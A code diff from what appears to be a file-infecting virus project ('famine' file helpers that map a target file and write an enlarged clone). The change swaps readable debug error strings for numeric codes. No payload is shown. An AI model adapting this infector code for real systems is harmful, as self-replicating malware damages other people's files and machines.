@@ -34,7 +34,7 @@ void			*safe_accessor(const size_t offset, const size_t size, \
 bool			free_accessor(struct safe_pointer *info)
 {
 #ifdef DEBUG
-	char e[] = {'m','u','m','n','m','a','p',' ','f','a','i','l','e','d','\0'};
+	char e[] = {'1','1','\0'};
 #endif
 	if (info->ptr)
 	{
@@ -51,11 +51,11 @@ bool			original_accessor(struct safe_pointer *accessor, const char *filename)
 	struct stat	buf;
 	int		fd = famine_open(filename, O_RDONLY);
 #ifdef DEBUG
-	char		e1[] = {'o','p','e','n',' ','f','a','i','l','e','d','\0'};
-	char		e2[] = {'f','s','t','a','t',' ','f','a','i','l','e','d','\0'};
-	char		e3[] = {'c','a','n','\'','t',' ','p','a','r','s','e',' ','d','i','r','\0'};
-	char 		e4[] = {'m','m','a','p',' ','f','a','i','l','e','d','\0'};
-	char 		e5[] = {'c','l','o','s','e',' ','f','a','i','l','e','d','\0'};
+	char		e1[] = {'1','2','\0'};
+	char		e2[] = {'1','3','\0'};
+	char		e3[] = {'1','4','\0'};
+	char 		e4[] = {'1','5','\0'};
+	char 		e5[] = {'1','6','\0'};
 #endif
 	if (fd < 0)
 		{return errors(ERR_SYS, e1);}
@@ -77,7 +77,7 @@ __warn_unused_result
 bool			clone_accessor(struct safe_pointer *accessor, const size_t original_filesize)
 {
 #ifdef DEBUG
-	char	e[] = {'m','m','a','p',' ','f','a','i','l','e','d','\0'};
+	char	e[] = {'1','7','\0'};
 #endif
 	accessor->filesize = original_filesize + MAX_EXT_SIZE;
 	accessor->ptr = famine_mmap(0, accessor->filesize, \
@@ -94,8 +94,8 @@ bool			write_clone_file(const struct safe_pointer accessor, \
 {
 	int	fd = famine_open(filename, O_CREAT | O_WRONLY | O_TRUNC, S_IRWXU);
 #ifdef DEBUG
-	char	e1[] = {'f','a','i','l',' ','c','r','e','a','t',' ','f','i','l','e','\0'};
-	char	e2[] = {'f','a','i','l',' ','w','r','i','t',' ','t','o',' ','f','i','l','e','\0'};
+	char	e1[] = {'1','8','\0'};
+	char	e2[] = {'1','9','\0'};
 #endif
 	if (fd == -1)
 		return errors(ERR_SYS, e1);
